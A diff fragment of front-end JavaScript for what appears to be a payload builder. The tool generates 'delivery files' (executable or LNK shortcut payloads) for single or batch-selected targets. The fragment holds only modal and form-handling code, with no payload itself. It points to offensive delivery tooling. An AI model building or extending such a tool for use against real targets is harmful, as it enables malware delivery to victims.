+        var batchNote = backdrop.querySelector('[data-gen-batch-note]');
+        var filenameInput = backdrop.querySelector('[data-gen-filename]');
+        var submitBtn = backdrop.querySelector('[data-gen-submit]');
+
+        if (state.mode === 'batch') {
+            title.textContent = '批量生成投放文件';
+            sub.textContent = '已选择 ' + state.ids.length + ' 个目标 · 按目标配置逐个生成';
+            if (filenameGroup) filenameGroup.hidden = true;
+            if (batchNote) batchNote.hidden = false;
+            submitBtn.querySelector('[data-gen-submit-label]').textContent = '生成 ' + state.ids.length + ' 个文件';
+        } else {
+            title.textContent = '生成投放文件 · ' + state.targetName;
+            sub.textContent = '选择载荷类型并确认生成参数';
+            if (filenameInput) filenameInput.value = state.filename || '';
+        }
+
+        fillLnkDefaults(backdrop);
+        syncContainerStyle(backdrop);
+        setKind(state, 'exe');
+
+        backdrop.addEventListener('change', function (event) {
+            if (event.target.matches('input[name="gen_container"]')) {
+                syncContainerStyle(backdrop);
+            }
+            updatePreviews(state);
+        });
+        if (filenameInput) {
+            filenameInput.addEventListener('input', function () {
+                updatePreviews(state);
+            });
+        }
+
+        backdrop.querySelectorAll('[data-gen-kind]').forEach(function (btn) {
+            btn.addEventListener('click', function () {
+                setKind(state, btn.getAttribute('data-gen-kind'));
+            });
+        });
+
+        function close() {
+            if (genBackdrop === backdrop) {
+                closeGenerateModal();
+            }
+        }
+
+        backdrop.querySelectorAll('[data-gen-close]').forEach(function (btn) {
+            btn.addEventListener('click', close);
+        });
+        backdrop.addEventListener('click', function (event) {
+            if (event.target === backdrop) {
+                close();
+            }
+        });
+
+        function onKeydown(event) {
+            if (event.key === 'Escape' && topModalLayer() === backdrop) {
+                close();
+            }
+        }
+        backdrop._genKey = onKeydown;
+        document.addEventListener('keydown', onKeydown);
+
+        submitBtn.addEventListener('click', function () {
+            var label = submitBtn.querySelector('[data-gen-submit-label]').textContent;
+            submitBtn.disabled = true;
+            submitBtn.querySelector('[data-gen-submit-label]').textContent = '打包中…';
+            submitGenerate(state, submitBtn, label);
+        });
+    }
+
+    document.getElementById('batchGenerateBtn').addEventListener('click', function () {
+        var ids = getCheckedIds();
+        if (ids.length === 0) {
+            notify('请先选择目标', 'error');
+            return;
+        }
+        openGenerate({ mode: 'batch', ids: ids });
+    });
+
+    document.getElementById('batchDeleteBtn').addEventListener('click', batchDelete);
+
+    document.addEventListener('click', function (event) {
+        var btn = event.target.closest('[data-generate-target]');
+        if (!btn) {
+            return;
+        }
+        openGenerate({
+            mode: 'single',
+            targetId: btn.getAttribute('data-generate-target'),
+            targetName: btn.getAttribute('data-generate-name'),
+            filename: btn.getAttribute('data-generate-filename') || '',
+            artifact: btn.getAttribute('data-generate-artifact') || ''
+        });
+    });
+})();
 </script>
 {% endblock %}
